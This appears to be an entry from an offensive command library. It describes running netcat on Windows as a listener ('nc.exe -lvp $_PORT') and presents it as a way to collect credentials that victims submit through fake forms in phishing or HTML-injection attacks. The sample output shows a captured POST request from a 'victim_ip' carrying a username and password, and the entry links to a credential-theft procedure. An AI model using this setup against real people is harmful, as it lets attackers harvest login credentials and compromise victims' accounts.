---
type: command
executor: cmd
data: nc.exe -lvp $_PORT
output: 'listening on [any] $_PORT ...'
platforms:
  - Windows
tags:
  - listening
  - tcp
  - capture
created_at: '2020-07-27T17:11:46.385430+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
verified: true
validated: true
---

# netcat-windows-listen-on-port

## Command

```cmd
nc.exe -lvp $_PORT
```

## Description

This command starts Netcat in listening mode on a specified port to accept incoming TCP connections and capture data, such as HTTP POST requests from a fake form. It is useful for receiving credential submissions during phishing or injection attacks on Windows systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PORT | The port to listen on (e.g., 9999 or 80) | Yes |
| -l | Listen mode for incoming connections | Built-in |
| -v | Verbose output to show connection details | Built-in |
| -p | Specify the port explicitly | Built-in |

## Examples

### Basic Usage

```cmd
nc.exe -lvp 9999
```

### Advanced Usage

```cmd
nc.exe -lvp 80 > output.txt
```

This redirects captured data to a file for logging.

## Expected Output

When successful, the command outputs:

```
listening on [any]  9999 ...

```

Upon connection:

```
connect to [192.168.43.183] from (UNKNOWN) [victim_ip] port_number
POST / HTTP/1.1
Host: 192.168.43.183:9999
Content-Type: application/x-www-form-urlencoded

uname=admin&pw=secret
```

## Related

- [[Related Procedure: Stored-HTML-Injection-for-Credential-Theft]]
- [[tools/Netcat]]
